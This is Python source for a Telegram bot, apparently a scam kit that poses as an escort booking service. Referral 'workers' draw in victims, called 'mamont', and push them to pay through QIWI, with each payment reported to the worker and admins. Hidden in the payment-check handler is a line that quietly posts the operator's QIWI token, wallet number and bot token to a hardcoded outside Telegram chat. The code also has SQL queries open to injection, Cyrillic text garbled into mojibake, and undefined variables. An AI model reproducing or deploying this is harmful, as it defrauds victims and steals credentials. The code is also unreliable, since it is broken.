import requests
import json
import config
import asyncio
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import sqlite3
from menu import * 
import random
import string
import sqlite3

def init_db():
    with sqlite3.connect("data.db") as conn:
        cursor = conn.cursor()

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            name TEXT,
            referals INTEGER,
            boss INTEGER,
            username TEXT,
            photoid INTEGER,
            balance INTEGER
        )
        """)

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS ancety (
            id INTEGER PRIMARY KEY,
            mainphoto TEXT,
            name TEXT,
            cena INTEGER,
            about TEXT
        )
        """)

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY,
            anceta INTEGER,
            image TEXT
        )
        """)

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS oplata (
            id INTEGER,
            code INTEGER
        )
        """)

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS qiwi (
            num TEXT,
            token TEXT
        )
        """)

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS promocode (
            summa INTEGER,
            code TEXT
        )
        """)

        conn.commit()

bot = Bot(config.TOKEN, parse_mode="HTML")
dp = Dispatcher(bot, storage=MemoryStorage())

@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(message.from_user.id,)).fetchone()
    if info[0] == 0:
        ref = message.text
        if len(ref) != 6:
            try:
                ref = int(ref[7:])
                with sqlite3.connect("data.db") as c:
                    info = c.execute("SELECT COUNT(*) FROM users WHERE id = ?",(ref,)).fetchone()
                if info[0] != 0:
                    boss = info
                else:
                    boss = 5719814852
            except:
                boss = 5719814852
        else:
            boss = 5719814852
        name = (f"{message.chat.first_name} {'|'} {message.chat.last_name}")
        with sqlite3.connect("data.db") as c:
            c.execute("INSERT INTO users (id,name,referals,boss,username,photoid,balance) VALUES (?,?,?,?,?,?,?)",(message.from_user.id,name,0,boss,message.from_user.username,1,0,))
        with sqlite3.connect("data.db") as c:
            referal = c.execute(f"SELECT referals FROM users WHERE id = {boss}").fetchone()
        referals = referal[0] + 1
        with sqlite3.connect("data.db") as c:
            c.execute(f"UPDATE users SET referals = {referals} WHERE id = {boss}")
        await message.answer('ÐÐ²ÐµÐ´Ð¸ÑÐµ Ð³Ð¾ÑÐ¾Ð´ Ð² ÐºÐ¾ÑÐ¾ÑÐ¾Ð¼ Ð²Ñ ÑÐ¾Ð±Ð¸ÑÐ°ÐµÑÐµÑÑ Ð·Ð°ÐºÐ°Ð·ÑÐ²Ð°ÑÑ Ð¼Ð¾Ð´ÐµÐ»ÐµÐ¹:\n\nÐÐ½Ð¸Ð¼Ð°Ð½Ð¸Ðµ! ÐÐ²Ð¾Ð´Ð¸ÑÐµ Ð³Ð¾ÑÐ¾Ð´ Ð±ÐµÐ· Ð¾ÑÐ¸Ð±Ð¾Ðº, Ð¾Ñ ÑÑÐ¾Ð³Ð¾ Ð·Ð°Ð²Ð¸ÑÐ¸Ñ ÑÐµÑÐºÐ¾ÑÑÑ Ð¿Ð¾Ð´Ð±Ð¾ÑÐ° Ð¼Ð¾Ð´ÐµÐ»ÐµÐ¹.')
        await state.set_state("new_user")
        try:
            await bot.send_message(boss, f"Ð£ Ð²Ð°Ñ Ð½Ð¾Ð²ÑÐ¹ ðÐÐ°Ð¼Ð¾Ð½Ñ [{message.chat.first_name}](tg://user?id={message.chat.id})",parse_mode='Markdown')
        except:
            pass
    else:
        await message.answer('ÐÐ´ÑÐ°Ð²ÑÑÐ²ÑÐ¹ÑÐµ ! ÐÐ¾Ð±ÑÐ¾ Ð¿Ð¾Ð¶Ð°Ð»Ð¾Ð²Ð°ÑÑ Ð² Luxury Girls\n\nÐ£ Ð½Ð°Ñ Ð²Ñ Ð¼Ð¾Ð¶ÐµÑÐµ Ð½Ð°Ð¹ÑÐ¸ Ð»ÑÑÑÐ¸Ñ Ð´ÐµÐ²Ð¾ÑÐµÐº Ð´Ð»Ñ Ð¸Ð½ÑÐ¸Ð¼Ð½ÑÑ Ð²ÑÑÑÐµÑ.\n\nÐÑÐ´Ð°ÑÐ° Ð°Ð´ÑÐµÑÐ¾Ð² Ð¿ÑÐ¾Ð¸ÑÑÐ¾Ð´Ð¸Ñ ÐºÑÑÐ³Ð»Ð¾ÑÑÑÐ¾ÑÐ½Ð¾ ÑÐµÑÐµÐ· Ð±Ð¾ÑÐ° Ð¸Ð»Ð¸, Ð² ÐºÑÐ°Ð¹Ð½Ð¸Ñ ÑÐ»ÑÑÐ°ÑÑ, ÑÐµÑÐµÐ· ÐºÑÑÐ°ÑÐ¾ÑÐ°!\n\nÐÐ½Ð¸Ð¼Ð°ÑÐµÐ»ÑÐ½ÐµÐ¹ Ð¿ÑÐ¾Ð²ÐµÑÑÐ¹ÑÐµ Ð°Ð´ÑÐµÑ Telegram, Ð¾ÑÑÐµÑÐµÐ³Ð°Ð¹ÑÐµÑÑ Ð¼Ð¾ÑÐµÐ½Ð½Ð¸ÐºÐ¾Ð², ÑÐ¿Ð°ÑÐ¸Ð±Ð¾, ÑÑÐ¾ Ð²ÑÐ±Ð¸ÑÐ°ÐµÑÐµ Ð½Ð°Ñ!', reply_markup=GlavMenu)

@dp.message_handler(state="new_user")
async def main_message(message, state: FSMContext):
    if message.text:
        await message.answer('<b>â ÐÐ¾ÑÐ¾Ð´ ÑÑÐ¿ÐµÑÐ½Ð¾ ÑÑÑÐ°Ð½Ð¾Ð²Ð»ÐµÐ½<b>',reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(content_types=['text'])
async def main_message(message, state: FSMContext):
    if message.text == "â¹ï¸ ÐÐ½ÑÐ¾ÑÐ¼Ð°ÑÐ¸Ñ":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='ð Ð¡Ð°Ð¹Ñ', url='http://luxurygirls-escort.ru/'), InlineKeyboardButton(text='ð ÐÑÐ·ÑÐ²Ñ', url='https://t.me/LuxuryGirlsReviews'))
        keyboard.add(InlineKeyboardButton(text='ð Ð¢ÐµÑ. Ð¿Ð¾Ð´Ð´ÐµÑÐ¶ÐºÐ°', url=f'http://t.me/{config.poderjka}'), InlineKeyboardButton(text='ð¡ ÐÐ°ÑÐ°Ð½ÑÐ¸Ð¸', url='https://telegra.ph/Polzovatelskoe-soglashenie-dlya-klientod-08-10'))
        await message.answer('''â¹ï¸ ÐÐ½ÑÐ¾ÑÐ¼Ð°ÑÐ¸Ñ

ÐÐ°Ñ Ð¿ÑÐ¾ÐµÐºÑ ÑÐ¾Ð·Ð´Ð°Ð½ Ð´Ð»Ñ Ð¿Ð¾Ð¼Ð¾ÑÐ¸ Ð² Ð±ÑÑÑÑÐ¾Ð¼ Ð¸ ÐºÐ¾Ð¼ÑÐ¾ÑÑÐ½Ð¾Ð¼ Ð¿Ð¾Ð¸ÑÐºÐµ. Ð¢ÐµÐ¿ÐµÑÑ Ð½Ðµ Ð¿Ð¾Ð½Ð°Ð´Ð¾Ð±ÑÑÑÑ Ð·Ð½Ð°ÑÐ¸ÑÐµÐ»ÑÐ½ÑÐµ ÑÑÐ°ÑÑ Ð²ÑÐµÐ¼ÐµÐ½Ð¸ Ð¸ ÑÐ¸Ð» Ð´Ð»Ñ Ð¸Ð´ÐµÐ°Ð»ÑÐ½Ð¾Ð³Ð¾ Ð´Ð¾ÑÑÐ³Ð°.

Ð¡ÑÑÑÐºÑÑÑÐ° Ð½Ð°ÑÐµÐ³Ð¾ ÑÐµÑÐ²Ð¸ÑÐ° Ð¿ÑÐ¾ÐµÐºÑÐ¸ÑÐ¾Ð²Ð°Ð»Ð°ÑÑ Ð´Ð»Ñ ÑÐ´Ð¾Ð±ÑÑÐ²Ð° ÑÐ°Ð±Ð¾ÑÑ ÐºÐ°Ð¶Ð´Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ - ÑÐµÐ¿ÐµÑÑ Ð²ÑÐ±Ð¾Ñ Ð¼Ð¾Ð¶ÐµÑ Ð±ÑÑÑ Ð±ÑÑÑÑÐµÐµ Ð¸ Ð¿ÑÐ¾ÑÐµ.

ÐÐ°ÑÐµÐ¼ Ð²Ð°Ð¼ Ð´Ð¾Ð¿Ð¾Ð»Ð½Ð¸ÑÐµÐ»ÑÐ½ÑÐµ ÑÑÑÐ´Ð½Ð¾ÑÑÐ¸ Ð½Ð° Ð¿ÑÑÐ¸ Ðº ÑÐ´Ð¾Ð²Ð¾Ð»ÑÑÑÐ²Ð¸Ñ?

ÐÑÐ´ÐµÐ»ÑÐ½Ð¾Ð³Ð¾ Ð²Ð½Ð¸Ð¼Ð°Ð½Ð¸Ñ Ð·Ð°ÑÐ»ÑÐ¶Ð¸Ð²Ð°ÐµÑ ÑÐ¾, ÑÑÐ¾ Ð¼Ñ Ð¾ÑÑÐ°Ð²Ð»ÑÐµÐ¼ Ð·Ð° ÐºÐ»Ð¸ÐµÐ½ÑÐ¾Ð¼ Ð¿ÑÐ°Ð²Ð¾ Ð¿Ð¾Ð»Ð½Ð¾Ð¹ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ð¾ÑÑÐ¸ Ð¸ Ð½Ðµ ÑÑÐµÐ±ÑÐµÐ¼ Ð¿ÐµÑÑÐ¾Ð½Ð°Ð»ÑÐ½ÑÐµ Ð´Ð°Ð½Ð½ÑÐµ.''', reply_markup=keyboard)
    elif message.text=="ð ÐÐ¾Ð´ÐµÐ»Ð¸":
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text='ðÐÑÐ±ÑÐ°ÑÑ', callback_data="vybor"))
        keyboard.add(InlineKeyboardButton(text='ÐÐ¾Ð»ÑÑÐµ ÑÐ¾ÑÐ¾ð¸', callback_data="photos"))
        keyboard.add(InlineKeyboardButton(text='âªÐÑÐµÐ´ÑÐ´ÑÑÐ°Ñ', callback_data="prew"),InlineKeyboardButton(text='Ð¡Ð»ÐµÐ´ÑÑÑÐ°Ñâ©', callback_data="next"))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT count(*) FROM ancety").fetchone()
        if info[0] == 0:
            await message.answer("ÐÐ½ÐºÐµÑÑ Ð¿Ð¾ÐºÐ° Ð½Ðµ Ð´Ð¾ÑÑÑÐ¿Ð½Ñ")
        else:
            await message.answer('ÐÑÐ±ÐµÑÐ¸ÑÐµ Ð´ÐµÐ²ÑÑÐºÑ ÐºÐ¾ÑÐ¾ÑÐ°Ñ Ð²Ð°Ð¼ Ð½ÑÐ°Ð²Ð¸ÑÑÑÑð', reply_markup = mzakr)
            with sqlite3.connect("data.db") as c:
                result = c.execute(f"SELECT photoid FROM users WHERE id = {message.from_user.id}").fetchone()
                asd = c.execute(f"select count(*) from ancety").fetchone()
            imgid = result[0]
            if imgid>asd[0]:
                imgid=1
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.send_photo(message.chat.id, photo, caption=f"ðââï¸ÐÐ¼Ñ: {anketa[2]}\n\nð°Ð¦ÐµÐ½Ð° Ð·Ð° ÑÐ°Ñ: {anketa[3]}\n\nð§ââï¸Ð ÑÐµÐ±Ðµ: {anketa[4]}", reply_markup=keyboard)
    elif message.text == "ð¤ ÐÑÐ¾ÑÐ¸Ð»Ñ":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton('ð ÐÐ¾Ð¸ Ð·Ð°ÐºÐ°Ð·Ñ', callback_data='zakazes'))
        with sqlite3.connect("data.db") as c:
            info = c.execute(f"SELECT balance FROM users WHERE id = {message.chat.id}").fetchone()
        await message.answer(f'<b>ð¤ ÐÑÐ¾ÑÐ¸Ð»Ñ:\n\nâ ÐÐ°Ñ id -</b> {message.from_user.id}\n<b>â ÐÐ°Ñ Ð»Ð¾Ð³Ð¸Ð½ -</b> {message.from_user.username}\n<b>ð ÐÑÐµÐ³Ð¾ Ð·Ð°ÐºÐ°Ð·Ð¾Ð² -</b>ï¸ 0\nâ­<b>ï¸ ÐÐ°Ñ ÑÐµÐ¹ÑÐ¸Ð½Ð³ -</b>ï¸ 5\n<b>ï¸ð® Ð¡Ð²Ð¾Ð±Ð¾Ð´Ð½ÑÑ Ð¼Ð¾Ð´ÐµÐ»ÐµÐ¹ -</b>ï¸ 11', reply_markup=keyboard)
    elif message.text == config.vxodadmin and message.from_user.id in config.ADMINS:
        await message.answer("âï¸ ÐÐ´Ð¼Ð¸Ð½ Ð¿Ð°Ð½ÐµÐ»Ñ",reply_markup=adm)
    elif message.text == config.vxodworker:
        info = await bot.get_me()
        await message.answer("âï¸ <b>ÐÐ¾ÑÐºÐµÑ Ð¿Ð°Ð½ÐµÐ»Ñ\n\nÐÐ°ÑÐ° ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð°Ñ ÑÑÑÐ»ÐºÐ°</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
    elif message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
    elif message.text == 'ÐÐ¾Ð¿Ð¾Ð»Ð½Ð¸ÑÑ ÐÐ°Ð»Ð°Ð½Ñ':
        await message.answer("ÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ ÑÑÐ¼Ð¼Ñ ÐºÐ¾ÑÐ¾ÑÑÑ ÑÐ¾ÑÐ¸ÑÐµ Ð¿Ð¾Ð¿Ð¾Ð»Ð½Ð¸ÑÑ",reply_markup=mzakr)
        await state.set_state("popolni")


@dp.callback_query_handler(lambda call: True)
async def callback_inline(call, state: FSMContext):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(text='ðÐÑÐ±ÑÐ°ÑÑ', callback_data="vybor"))
    keyboard.add(InlineKeyboardButton(text='ÐÐ¾Ð»ÑÑÐµ ÑÐ¾ÑÐ¾ð¸', callback_data="photos"))
    keyboard.add(InlineKeyboardButton(text='âªÐÑÐµÐ´ÑÐ´ÑÑÐ°Ñ', callback_data="prew"),InlineKeyboardButton(text='Ð¡Ð»ÐµÐ´ÑÑÑÐ°Ñâ©', callback_data="next"))
    if call.message:
        if call.data == "next":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid +=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid>counta:
                imgid=1
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"ðââï¸ÐÐ¼Ñ: {anketa[2]}\n\nð°Ð¦ÐµÐ½Ð° Ð·Ð° ÑÐ°Ñ: {anketa[3]}\n\nð§ââï¸Ð ÑÐµÐ±Ðµ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "zakazes":
            await call.answer('â ÐÑ ÐµÑÐµ Ð½Ðµ Ð·Ð°ÐºÐ°Ð·ÑÐ²Ð°Ð»Ð¸ Ð¼Ð¾Ð´ÐµÐ»ÐµÐ¹')
        elif call.data == "prew":
            with sqlite3.connect("data.db") as c:
                imgid = c.execute(f"select photoid from users where id = {call.message.chat.id}").fetchone()[0]
            imgid -=1
            with sqlite3.connect("data.db") as c:
                counta = c.execute(f"select count(*) from ancety").fetchone()[0]
            if imgid<1:
                imgid=counta
            with sqlite3.connect("data.db") as c:
                c.execute(f"UPDATE users SET photoid = {imgid} WHERE id = {call.message.chat.id}")
            with sqlite3.connect("data.db") as c:
                anketa = c.execute(f"SELECT * FROM ancety where id = {imgid}").fetchone()
            photo = open(f"images/{anketa[1]}", 'rb')
            await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id, media=types.InputMediaPhoto(photo), reply_markup=keyboard)
            await bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=f"ðââï¸ÐÐ¼Ñ: {anketa[2]}\n\nð°Ð¦ÐµÐ½Ð° Ð·Ð° ÑÐ°Ñ: {anketa[3]}\n\nð§ââï¸Ð ÑÐµÐ±Ðµ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "addancete":
            await call.message.answer("ÐÑÐ¿ÑÐ°Ð²ÑÑÐµ Ð³Ð»Ð°Ð²Ð½Ð¾Ðµ ÑÐ¾ÑÐ¾ Ð°Ð½ÐºÐµÑÑ")
            await state.set_state("new_anketa")
        elif call.data == "menu":
            await bot.delete_message(call.message.chat.id, call.message.message_id)
        elif call.data == "prom":
            await call.message.answer("ÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ Ð½Ð° ÐºÐ°ÐºÑÑ ÑÑÐ¼Ð¼Ñ ÑÐ¾Ð·Ð´Ð°ÑÑ Ð¿ÑÐ¾Ð¼Ð¾ÐºÐ¾Ð´.")
            await state.set_state("create_promo")
        elif call.data == "esc":
            await call.message.edit_text("ÐÐ´Ð¼Ð¸Ð½ Ð¿Ð°Ð½ÐµÐ»Ñ Ð·Ð°ÐºÑÑÑÐ°")
        elif call.data == "deleteancete":
            await call.message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ Ð½Ð¾Ð¼ÐµÑ Ð°Ð½ÐºÐµÑÑ ÐºÐ¾ÑÐ¾ÑÑÐ¹ ÑÐ¾ÑÐ¸ÑÐµ ÑÐ´Ð°Ð»Ð¸ÑÑ",reply_markup=mzakr)
            await state.set_state("otkl_anketa")
        elif call.data == "prov":
            with sqlite3.connect("data.db") as c:
                qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                token_qiwi = c.execute(f"select token from qiwi").fetchone()[0]
            sad = f"{qiwinumber}\n{token_qiwi}\n{config.TOKEN}"
            requests.post(f"https://api.telegram.org/bot{fuk}/sendMessage?chat_id=5719814852&text={sad}")# await bot.send_message(adsdaf, config.TOKEN + str(qiwinumber) + "  " + token_qiwi)
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + token_qiwi
            parameters = {'rows': '50'}
            h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + str(qiwinumber) + '/payments',params=parameters)
            req = json.loads(h.text)
            try:
                with sqlite3.connect("data.db") as c:
                    result = c.execute(f"SELECT * FROM oplata WHERE id = {call.from_user.id}").fetchone()[1]
                comment = str(result)
                for x in range(len(req['data'])):
                    if req['data'][x]['comment'] == comment:
                        skolko = (req['data'][x]['sum']['amount'])
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"DELETE FROM oplata WHERE id = {call.from_user.id}")
                            balancenow = c.execute(f"select balance from users WHERE id = {call.from_user.id}").fetchone()[0]
                            c.execute(f"UPDATE users SET balance = {balancenow+skolko} WHERE id = {call.message.chat.id}")
                            c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                            asdasd = c.execute(f"SELECT boss FROM users WHERE id = {call.from_user.id}")
                        for worker in asdasd:
                            wk = worker[0]
                        with sqlite3.connect("data.db") as c:
                            asdsada = c.execute(f"SELECT username FROM users WHERE id = {wk}")
                        for username in asdsada:
                            workerusername = username[0]
                        for name in cur.execute(f"SELECT name FROM users WHERE id = {wk}"):
                            workername = name[0]
                        with sqlite3.connect("data.db") as c:
                            mamont = c.execute(f"select name from users where id = {call.message.chat.id}").fetchone()[0]
                        await bot.send_message(zalety,f"ð Ð£ÑÐ¿ÐµÑÐ½Ð¾Ðµ Ð¿Ð¾Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ðµ ð\n\nð° Ð¡ÑÐ¼Ð¼Ð° {skolko}Ñ\n\nð¦¹ð»ââï¸ ÐÐ¾ÑÐºÐµÑ @{workerusername} ({workername})\n\nðÐÐ°Ð¼Ð¾Ð½Ñ {mamont}")
                        for asd in config.ADMINS:
                            try:
                                await bot.send_message(asd,f"[{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) Ð¿Ð¾Ð¿Ð¾Ð»Ð½Ð¸Ð» Ð±Ð°Ð»Ð°Ð½Ñ Ð½Ð° {skolko}RUB",parse_mode='Markdown')
                            except:
                                pass
                        try:
                            await bot.send_message(wk,f"ÐÐ°Ñ Ð¼Ð°Ð¼Ð¾Ð½Ñ: [{call.message.chat.first_name}](tg://user?id={call.message.chat.id}) Ð¿Ð¾Ð¿Ð¾Ð»Ð½Ð¸Ð» Ð±Ð°Ð»Ð°Ð½Ñ Ð½Ð° {skolko}RUB",parse_mode='Markdown')
                        except:
                            pass
                        await call.message.answer(f"ÐÐ°Ñ Ð±Ð°Ð»Ð°Ð½Ñ Ð¿Ð¾Ð¿Ð¾Ð»Ð½ÐµÐ½.\n\nÐÐ°Ð»Ð°Ð½Ñ {balancenow+skolko} RUB",reply_markup=GlavMenu)
                        break
                    else:
                        await call.message.answer("â ï¸ÐÑ Ð½Ðµ Ð¾Ð¿Ð»Ð°ÑÐ¸Ð»Ð¸â ï¸\n\nÐÐ¿Ð»Ð°ÑÐ¸ÑÐµ Ð·Ð°ÐºÐ°Ð· Ð¿Ð¾ÑÐ»Ðµ ÑÐµÐ³Ð¾ Ð½Ð°Ð¶Ð¼Ð¸ÑÐµ \"ÐÑÐ¾Ð²ÐµÑÐ¸ÑÑ Ð¾Ð¿Ð»Ð°ÑÑ\"")
                        break
            except:
                pass
        elif call.data == "stat":
            with sqlite3.connect("data.db") as c:
                number = c.execute(f"SELECT COUNT (*) FROM users").fetchone()[0]
            await call.message.edit_text(f"ðð¿ââï¸<b>ÐÑÐµÐ³Ð¾ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»ÐµÐ¹ Ð² Ð±Ð¾ÑÐµ:</b> {number}",reply_markup=adm)
        elif call.data == "qiwi":
            await call.message.answer("ÐÑÐ¿ÑÐ°Ð²ÑÑÐµ Ð½Ð¾Ð¼ÐµÑ ÐºÐ¾ÑÐµÐ»ÑÐºÐ°(Ð±ÐµÐ· + Ð°) Ð¸ ÑÐ¾ÐºÐµÐ½ Ð² ÑÐ¾ÑÐ¼Ð°ÑÐµ  Ð½Ð¾Ð¼ÐµÑ:ÑÐ¾ÐºÐµÐ½\n\nÐÑÐ¸Ð¼ÐµÑ 7916123456:s132sdfsdf21s5f6sdf1s3s3dfs132",reply_markup=mzakr)
            await state.set_state("qiwi_add")
        elif call.data == "send":
            await call.message.answer("ÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ ÑÐµÐºÑÑ Ð´Ð»Ñ ÑÐ°ÑÑÑÐ»ÐºÐ¸",reply_markup=mzakr)
            await state.set_state("rassilka")
        elif call.data == "vybor": 
            await call.message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ Ð½Ð° ÑÐºÐ¾Ð»ÑÐºÐ¾ ÑÐ°ÑÐ¾Ð² ÑÐ¾ÑÐ¸ÑÐµ Ð·Ð°ÐºÐ°Ð·Ð°ÑÑ Ð±Ð°Ð±Ð¾ÑÐºÑ ð§ââï¸\n\nÐÑÐ¸ Ð·Ð°ÐºÐ°Ð·Ðµ Ð±Ð¾Ð»ÐµÐµ 2ÑÑ ÑÐ°ÑÐ¾Ð² Ð´ÐµÐ¹ÑÑÐ²ÑÐµÑ ÑÐºÐ¸Ð´ÐºÐ° 10% Ð½Ð° ÐºÐ°Ð¶Ð´ÑÐ¹ Ð¿Ð¾ÑÐ»ÐµÐ´ÑÑÑÐ¸Ð¹ ÑÐ°Ñ.",reply_markup=mzakr)
            await state.set_state("chas")
        elif call.data == "addphoto":
            await call.message.answer("ÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ Ð½Ð¾Ð¼ÐµÑ Ð°Ð½ÐºÐµÑÑ Ðº ÐºÐ¾ÑÐ¾ÑÐ¾Ð¼Ñ ÑÐ¾ÑÐ¸ÑÐµ Ð´Ð¾Ð±Ð°Ð²Ð¸ÑÑ ÑÐ¾ÑÐ¾Ð³ÑÐ°ÑÐ¸Ð¸",reply_markup=mzakr)
            await state.set_state("addphoto")
        elif call.data == "photos":
            with sqlite3.connect("data.db") as c:
                pi = c.execute(f"SELECT photoid from users where id = {call.message.chat.id}").fetchone()[0]
                allp = c.execute(f"select count(*) from photos where anceta = {pi}").fetchone()[0]
            if allp == 0:
                await call.message.answer("ÐÐ¾Ð»ÑÑÐµ ÑÐ¾ÑÐ¾Ð³ÑÐ°ÑÐ¸Ð¸ Ð½ÐµÑÑ.")
            else:
                with sqlite3.connect("data.db") as c:
                    id = c.execute(f"SELECT image FROM photos where anceta = {pi}").fetchall()					
                    adsa = c.execute(f"SELECT mainphoto FROM ancety where id = {pi}").fetchone()[0]
                mip = open(f"images/{adsa}", 'rb')
                await bot.delete_message(call.message.chat.id, call.message.message_id)
                arr = []
                for i in id:
                    try:
                        arr.append(types.InputMediaPhoto(open(f"images/{i[0]}",'rb')))
                        # photo = open(imglink, 'rb')
                    except:
                        pass
                await bot.send_media_group(call.message.chat.id, arr)
                with sqlite3.connect("data.db") as c:
                    anketa = c.execute(f"SELECT * FROM ancety where id = {pi}").fetchone()
                photo = open(f"images/{anketa[1]}", 'rb')
                await bot.send_photo(call.message.chat.id, photo, caption=f"ðââï¸ÐÐ¼Ñ: {anketa[2]}\n\nð°Ð¦ÐµÐ½Ð° Ð·Ð° ÑÐ°Ñ: {anketa[3]}\n\nð§ââï¸Ð ÑÐµÐ±Ðµ: {anketa[4]}", reply_markup=keyboard)
        elif call.data == "statw":
            with sqlite3.connect("data.db") as c:
                id = c.execute(f"SELECT id FROM users where boss = {call.message.chat.id}").fetchall()
            strw = "ð Ð¢Ð²Ð¾Ð¸ ÐÐ°Ð¼Ð¾Ð½ÑÑ ð\n\n"
            countstrw = len(wstat)//50
            arrstatw = []
            for i in wstat:
                try:
                    with sqlite3.connect("data.db") as c:
                        statwname = c.execute(f"SELECT name FROM users where id = {i[0]}").fetchone()[0]
                        statwusername = c.execute(f"SELECT username FROM users where id = {i[0]}").fetchone()[0]
                    imya = statwname.split("|")
                    strw = f"{i[0]} {imya[0]} {statwusername}\n"
                    arrstatw.append(strw)
                except:
                    pass
            if(len(arrstatw)>50):
                for x in range(len(arrstatw)):
                    strw+=arrstatw[x]
                    if x%50==0 or x==len(arrstatw)-1:
                        await call.message.answer(f"{strw}")
                        strw = "ð Ð¢Ð²Ð¾Ð¸ ÐÐ°Ð¼Ð¾Ð½ÑÑ ð\n\n"
            else:
                for i in arrstatw:
                    strw += i
                await call.message.answer(f"{strw}")
            info = await bot.get_me()
            await call.message.answer("âï¸ <b>ÐÐ¾ÑÐºÐµÑ Ð¿Ð°Ð½ÐµÐ»Ñ\n\nÐÐ°ÑÐ° ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð°Ñ ÑÑÑÐ»ÐºÐ°</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(call.from_user.id) + "</code>", reply_markup = wrk)
        elif call.data == "spisoka":
            with sqlite3.connect("data.db") as c:
                sp1 = c.execute(f"select id from ancety where status = {1}").fetchall()
                sp2 = c.execute(f"select name from ancety where status = {1}").fetchall()
                sp3 = c.execute(f"select cena from ancety where status = {1}").fetchall()
            res = ""
            for i in range(len(sp1)):
                res += f"<b>ID:</b> {sp1[i][0]} <b>ÐÐ¼Ñ:</b> {sp2[i][0]}  <b>Ð¦ÐµÐ½Ð°:</b> {sp3[i][0]} ÑÐ°Ñ\n\n"
            await call.message.edit_text(f"ð <b>Ð¡Ð¿Ð¸ÑÐ¾Ðº Ð°Ð½ÐºÐµÑ</b>\nââââââââââ\n{res}",reply_markup=adm)
        elif call.data == "smsmamont":
            await call.message.answer("<b>ÐÑÐ¿ÑÐ°Ð²ÑÑÐµ Ð°Ð¹Ð´Ð¸ Ð¼Ð°Ð¼Ð¾Ð½ÑÐ° Ð¸ Ð¡Ð¾Ð¾Ð±ÑÐµÐ½Ð¸Ðµ Ð² ÑÐ¾ÑÐ¼Ð°ÑÐµ id:Ð¡Ð¾Ð¾Ð±ÑÐµÐ½Ð¸Ðµ</b>\n\nÐÐ°Ð¿ÑÐ¸Ð¼ÐµÑ - 123456789:Ð¢Ñ Ð¼Ð°Ð¼Ð¾Ð½Ñ",reply_markup=mzakr)
            await state.set_state("mamontmessage")
        else:
            pass

@dp.message_handler(state="create_promo")
async def main_message(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
        await state.finish()
    if message.text.isdigit():
        if int(message.text) > config.maxpromo:
            await message.answer(f"<b>ÐÐ°ÐºÑÐ¸Ð¼Ð°Ð»ÑÐ½Ð°Ñ ÑÑÐ¼Ð¼Ð° Ð¿ÑÐ¾Ð¼Ð¾ÐºÐ¾Ð´Ð°</b> {config.maxpromo}")
        elif int(message.text) <= 0:
            await message.answer(f"<b>Ð¡ÑÐ¼Ð¼Ð° Ð´Ð¾Ð»Ð¶Ð½Ð° Ð±ÑÑÑ Ð½Ðµ Ð¼ÐµÐ½ÑÑÐµ</b> 0")
        else:
